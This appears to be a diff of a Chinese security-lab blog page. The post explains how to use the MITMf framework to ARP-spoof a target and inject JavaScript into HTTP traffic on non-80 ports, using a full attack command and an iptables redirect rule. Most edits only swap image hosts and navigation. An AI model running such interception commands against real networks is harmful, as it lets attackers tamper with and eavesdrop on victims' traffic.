@@ -19,16 +19,16 @@
 <meta property="og:url" content="http://www.future-sec.com/using-MITMF-attack-not-80-port-http.html">
 <meta property="og:site_name" content="伏宸安全实验室-Future-Sec Information Security Lab">
 <meta property="og:description" content="说明MITMf 是一款可拓展性很高的中间人攻击框架，基于代理工具sergio-proxy修改而来。 问题在实际使用中，发现一个问题，无法劫持修改非80端口 HTTP数据，例如注入js 替换字符串。例如注入一段js 1sudo  python mitmf.py  -i wlan0 --spoof --arp --target  172.18.219.3 --gateway  172.18.219.1">
-<meta property="og:image" content="http://ozuqqvmm5.bkt.clouddn.com/15129397954576.jpg">
-<meta property="og:image" content="http://ozuqqvmm5.bkt.clouddn.com/15129398489571.jpg">
-<meta property="og:image" content="http://ozuqqvmm5.bkt.clouddn.com/Screenshot35.jpg">
-<meta property="og:image" content="http://ozuqqvmm5.bkt.clouddn.com/Screenshot36.jpg">
-<meta property="og:image" content="http://ozuqqvmm5.bkt.clouddn.com/15129405294732.jpg">
-<meta property="og:updated_time" content="2017-12-21T07:42:22.081Z">
+<meta property="og:image" content="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/15129397954576.jpg">
+<meta property="og:image" content="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/15129398489571.jpg">
+<meta property="og:image" content="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/Screenshot35.jpg">
+<meta property="og:image" content="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/Screenshot36.jpg">
+<meta property="og:image" content="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/15129405294732.jpg">
+<meta property="og:updated_time" content="2018-06-29T09:01:10.244Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="使用MITMF中间人攻击非80端口的HTTP">
 <meta name="twitter:description" content="说明MITMf 是一款可拓展性很高的中间人攻击框架，基于代理工具sergio-proxy修改而来。 问题在实际使用中，发现一个问题，无法劫持修改非80端口 HTTP数据，例如注入js 替换字符串。例如注入一段js 1sudo  python mitmf.py  -i wlan0 --spoof --arp --target  172.18.219.3 --gateway  172.18.219.1">
-<meta name="twitter:image" content="http://ozuqqvmm5.bkt.clouddn.com/15129397954576.jpg">
+<meta name="twitter:image" content="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/15129397954576.jpg">
   
     <link rel="alternative" href="/atom.xml" title="伏宸安全实验室-Future-Sec Information Security Lab" type="application/atom+xml">
   
@@ -187,17 +187,17 @@
 <h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>在实际使用中，发现一个问题，无法劫持修改非80端口 HTTP数据，例如注入js 替换字符串。<br>例如注入一段js</p>
 <figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">sudo </span> <span class="string">python </span><span class="string">mitmf.</span><span class="string">py </span> -i <span class="string">wlan0 </span><span class="built_in">--spoof</span> <span class="built_in">--arp</span> <span class="built_in">--target</span>  <span class="string">172.</span><span class="string">18.</span><span class="string">219.</span>3 <span class="built_in">--gateway</span>  <span class="string">172.</span><span class="string">18.</span><span class="string">219.</span>1  <span class="built_in">--inject</span> <span class="built_in">--html-payload</span> <span class="string">'&lt;script&gt;alert(0)&lt;/script&gt;'</span></div></pre></td></tr></table></figure>
 <p>victim 访问<br><a href="http://yaseng.org/project" rel="external nofollow noopener noreferrer" target="_blank">http://yaseng.org/project</a></p>
-<p><img src="http://ozuqqvmm5.bkt.clouddn.com/15129397954576.jpg" alt=""></p>
+<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/15129397954576.jpg" alt=""></p>
 <p>访问非80端口的http web<br><a href="http://www.jcr.cacrnet.org.cn:8080/mmxb/CN/volumn/home.shtml" rel="external nofollow noopener noreferrer" target="_blank">http://www.jcr.cacrnet.org.cn:8080/mmxb/CN/volumn/home.shtml</a><br>无任何提示  </p>
-<p><img src="http://ozuqqvmm5.bkt.clouddn.com/15129398489571.jpg" alt=""></p>
+<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/15129398489571.jpg" alt=""></p>
 <p>attack 端</p>
-<p><img src="http://ozuqqvmm5.bkt.clouddn.com/Screenshot35.jpg" alt="img"></p>
+<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/Screenshot35.jpg" alt="img"></p>
 <h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>简单看了一下代码<br>MITMf/core/utils.py   line:84</p>
 <figure class="highlight lua"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">def HTTP(self, http_redir_port):</div><div class="line">    <span class="built_in">log</span>.<span class="built_in">debug</span>(<span class="string">"Setting iptables HTTP redirection rule from port 80 to &#123;&#125;"</span>.<span class="built_in">format</span>(http_redir_port))</div><div class="line">    <span class="built_in">os</span>.system(<span class="string">'iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port &#123;&#125;'</span>.<span class="built_in">format</span>(http_redir_port))</div></pre></td></tr></table></figure>
 <p>iptables 把80端口的mitmf 监听的10000端口，很显然，需要劫持哪个端口，加一条规则就行了。<br>例如 </p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo  iptables -t<span class="built_in"> nat </span>-A PREROUTING -p tcp --destination-port 8080 -j REDIRECT --to-port  10000</div></pre></td></tr></table></figure>
 <p>attack</p>
-<p><img src="http://ozuqqvmm5.bkt.clouddn.com/Screenshot36.jpg" alt="mg"><br>victim<br><img src="http://ozuqqvmm5.bkt.clouddn.com/15129405294732.jpg" alt=""></p>
+<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/Screenshot36.jpg" alt="mg"><br>victim<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/15129405294732.jpg" alt=""></p>
 <h2 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h2><p>使用mitmf 来绕过HSTS站点抓取登陆明文  <a href="http://yaseng.org/hsts-bypass-with-mitmf.html" rel="external nofollow noopener noreferrer" target="_blank">http://yaseng.org/hsts-bypass-with-mitmf.html</a></p>
 
       
@@ -217,9 +217,9 @@
     </a>
   
   
-    <a href="/iot-security-hardware-debuging.html" id="article-nav-older" class="article-nav-link-wrap">
+    <a href="/android-ssl-security.html" id="article-nav-older" class="article-nav-link-wrap">
       <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">物联网硬件安全分析基础-串口调试</div>
+      <div class="article-nav-title">你在互联网上的数据还在裸奔吗？</div>
     </a>
   
 </nav>
@@ -257,7 +257,11 @@
 	</li>
       
 	<li>
-	  <a href="/categories/系统安全/">系统安全 (1)</a>
+	  <a href="/categories/系统安全/">系统安全 (2)</a>
+	</li>
+      
+	<li>
+	  <a href="/categories/BROADCOM-WI-FI/">BROADCOM WI-FI (0)</a>
 	</li>
       
     </ul>
@@ -274,7 +278,7 @@
   <div class="widget-wrap">
     <div class="widget">
       
-      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/BROADCOM-WI-FI/"><i class="fa fa-tags"></i>BROADCOM WI-FI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MITMf/"><i class="fa fa-tags"></i>MITMf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Poc/"><i class="fa fa-tags"></i>Poc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/QARK/"><i class="fa fa-tags"></i>QARK</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tomcat/"><i class="fa fa-tags"></i>Tomcat</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/UART串口调试/"><i class="fa fa-tags"></i>UART串口调试</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/app签名/"><i class="fa fa-tags"></i>app签名</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/goahead/"><i class="fa fa-tags"></i>goahead</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/https/"><i class="fa fa-tags"></i>https</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/"><i class="fa fa-tags"></i>python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssl/"><i class="fa fa-tags"></i>ssl</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web安全/"><i class="fa fa-tags"></i>web安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/内网渗透/"><i class="fa fa-tags"></i>内网渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/密码爆破/"><i class="fa fa-tags"></i>密码爆破</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/指纹识别/"><i class="fa fa-tags"></i>指纹识别</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/智能锁/"><i class="fa fa-tags"></i>智能锁</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/条形码/"><i class="fa fa-tags"></i>条形码</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/硬件分析/"><i class="fa fa-tags"></i>硬件分析</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/硬件安全/"><i class="fa fa-tags"></i>硬件安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/移动安全/"><i class="fa fa-tags"></i>移动安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/自动化检测/"><i class="fa fa-tags"></i>自动化检测</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/芯片安全/"><i class="fa fa-tags"></i>芯片安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/蓝牙攻击/"><i class="fa fa-tags"></i>蓝牙攻击</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/贝叶斯分类/"><i class="fa fa-tags"></i>贝叶斯分类</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/远程代码执行/"><i class="fa fa-tags"></i>远程代码执行</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/验证码/"><i class="fa fa-tags"></i>验证码</a></li></ul>
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/BROADCOM-WI-FI/"><i class="fa fa-tags"></i>BROADCOM WI-FI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MITMf/"><i class="fa fa-tags"></i>MITMf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Poc/"><i class="fa fa-tags"></i>Poc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/QARK/"><i class="fa fa-tags"></i>QARK</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tomcat/"><i class="fa fa-tags"></i>Tomcat</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/UART串口调试/"><i class="fa fa-tags"></i>UART串口调试</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/app签名/"><i class="fa fa-tags"></i>app签名</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/goahead/"><i class="fa fa-tags"></i>goahead</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/https/"><i class="fa fa-tags"></i>https</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/"><i class="fa fa-tags"></i>python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssl/"><i class="fa fa-tags"></i>ssl</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web安全/"><i class="fa fa-tags"></i>web安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/内网渗透/"><i class="fa fa-tags"></i>内网渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/密码爆破/"><i class="fa fa-tags"></i>密码爆破</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/指纹识别/"><i class="fa fa-tags"></i>指纹识别</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/智能锁/"><i class="fa fa-tags"></i>智能锁</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/条形码/"><i class="fa fa-tags"></i>条形码</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/硬件分析/"><i class="fa fa-tags"></i>硬件分析</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/硬件安全/"><i class="fa fa-tags"></i>硬件安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/移动安全/"><i class="fa fa-tags"></i>移动安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/系统安全/"><i class="fa fa-tags"></i>系统安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/自动化检测/"><i class="fa fa-tags"></i>自动化检测</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/芯片安全/"><i class="fa fa-tags"></i>芯片安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/蓝牙攻击/"><i class="fa fa-tags"></i>蓝牙攻击</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/贝叶斯分类/"><i class="fa fa-tags"></i>贝叶斯分类</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/远程代码执行/"><i class="fa fa-tags"></i>远程代码执行</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/验证码/"><i class="fa fa-tags"></i>验证码</a></li></ul>
     </div>
   </div>
 
@@ -286,6 +290,8 @@
 <!-- BEGIN FEATURED POSTS -->                            
 <h2>Featured Posts</h2>
 <div class="recent-news margin-bottom-10">
+  
+    
   
     
   
